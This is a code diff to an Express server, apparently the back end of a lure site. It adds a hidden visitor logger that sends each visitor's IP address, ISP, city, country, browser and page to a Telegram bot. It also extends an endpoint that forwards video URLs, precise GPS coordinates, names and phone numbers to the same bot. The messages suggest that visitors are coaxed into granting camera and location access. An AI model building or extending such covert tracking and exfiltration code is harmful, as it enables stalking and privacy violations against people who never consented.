@@ -23,7 +23,14 @@ if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_IDS.length === 0) {
 // ================== MIDDLEWARE ==================
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
+
+// ================== HELPERS ==================
+function getClientIp(req) {
+  // Render / proxy üçün
+  const xf = req.headers['x-forwarded-for'];
+  if (xf) return xf.split(',')[0].trim();
+  return req.socket?.remoteAddress || 'unknown';
+}
 
 // ================== TELEGRAM SENDER ==================
 async function sendToTelegram(text) {
@@ -43,18 +50,91 @@ async function sendToTelegram(text) {
   }
 }
 
-// ================== HELPERS ==================
-function getClientIp(req) {
-  // Render / proxy üçün
-  const xf = req.headers['x-forwarded-for'];
-  if (xf) return xf.split(',')[0].trim();
-  return req.socket?.remoteAddress || 'unknown';
+// ================== GEO HELPER ==================
+async function getGeoInfo(ip) {
+  try {
+    const cleanIp = (ip || '').replace('::ffff:', '').split(',')[0].trim();
+
+    // Local / private IP-ləri skip et
+    if (
+      !cleanIp ||
+      cleanIp === 'unknown' ||
+      cleanIp === '127.0.0.1' ||
+      cleanIp === '::1' ||
+      cleanIp.startsWith('192.168.') ||
+      cleanIp.startsWith('10.') ||
+      cleanIp.startsWith('172.')
+    ) {
+      return { country: 'Local', city: 'Local', isp: 'Local' };
+    }
+
+    const r = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,query`);
+    const data = await r.json();
+    if (data.status === 'success') {
+      return { country: data.country, city: data.city, isp: data.isp };
+    }
+    return {};
+  } catch (e) {
+    return {};
+  }
 }
+
+// ================== GLOBAL VISITOR LOGGER ==================
+// Bu middleware HƏR səhifə sorğusunu tutur - JS, icazə, brauzer fərq etmir.
+// Yalnız HTML səhifə sorğularını loglayır (CSS, JS, şəkil faylları yox).
+
+const loggedIPs = new Map(); // IP -> timestamp (spam qarşısını almaq üçün)
+const LOG_COOLDOWN_MS = 30000; // 30 saniyə
+
+app.use(async (req, res, next) => {
+  try {
+    const isPageRequest =
+      req.method === 'GET' &&
+      !req.path.startsWith('/api/') &&
+      !req.path.startsWith('/webhook/') &&
+      !req.path.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|json)$/i);
+
+    if (isPageRequest) {
+      const ip = getClientIp(req);
+      const now = Date.now();
+      const lastSeen = loggedIPs.get(ip);
+
+      if (!lastSeen || (now - lastSeen) > LOG_COOLDOWN_MS) {
+        loggedIPs.set(ip, now);
+
+        // Asinxron göndər - istifadəçini gözlətmə
+        (async () => {
+          const geo = await getGeoInfo(ip);
+          let msg = `🚨 YENİ ZİYARƏTÇİ\n`;
+          msg += `🛰️ IP: ${ip}\n`;
+          if (geo.country && geo.country !== 'Local') {
+            msg += `🌍 Ölkə: ${geo.country}\n`;
+            if (geo.city) msg += `🏙️ Şəhər: ${geo.city}\n`;
+            if (geo.isp) msg += `📡 ISP: ${geo.isp}\n`;
+          } else {
+            msg += `📍 Lokasiya: Local / bilinmir\n`;
+          }
+          msg += `🖥️ UA: ${(req.headers['user-agent'] || 'bilinmir').substring(0, 100)}\n`;
+          msg += `🔗 Path: ${req.path}\n`;
+          msg += `⏰ ${new Date().toISOString()}`;
+
+          await sendToTelegram(msg.trim());
+        })();
+      }
+    }
+  } catch (e) {
+    console.error('Visitor logger xətası:', e.message);
+  }
+  next();
+});
+
+// Statik fayllar (middleware-dən SONRA)
+app.use(express.static(path.join(__dirname, 'public')));
 
 // ================== API ==================
 app.post('/api/send-data', async (req, res) => {
   try {
-    const { videoUrl, location, action, name, phone } = req.body; // <-- buraya name, phone əlavə edildi
+    const { videoUrl, location, action, name, phone } = req.body;
 
     const ip = getClientIp(req);
 
@@ -65,7 +145,6 @@ app.post('/api/send-data', async (req, res) => {
       message += `🧩 Action: ${action}\n`;
     }
 
-    // Burada ad və telefonu göndəririk
     if (name || phone) {
       message += `👤 Ad: ${name || 'yox'}\n`;
       message += `📞 Telefon: ${phone || 'yox'}\n`;
@@ -78,8 +157,15 @@ app.post('/api/send-data', async (req, res) => {
     if (location?.latitude && location?.longitude) {
       message += `📍 Region təsdiqləndi\n`;
       message += `🌍 ${location.latitude}, ${location.longitude}\n`;
+      if (location.accuracy) message += `🎯 Dəqiqlik: ±${location.accuracy}m\n`;
     } else {
       message += `📍 Lokasiya yoxdur (icazə verilmədi)\n`;
+    }
+
+    // Əlavə olaraq geo məlumat serverdən
+    const geo = await getGeoInfo(ip);
+    if (geo.country && geo.country !== 'Local') {
+      message += `🌐 Təxmini: ${geo.city || '?'}, ${geo.country}\n`;
     }
 
     await sendToTelegram(message.trim());
@@ -90,7 +176,6 @@ app.post('/api/send-data', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-
 
 // ================== TELEGRAM WEBHOOK ==================
 app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
@@ -130,7 +215,7 @@ Daxil edilən məlumatlar adminə bildirilir.`
   }
 });
 
-// ================== FRONTEND ==================
+// ================== FRONTEND (SPA fallback) ==================
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
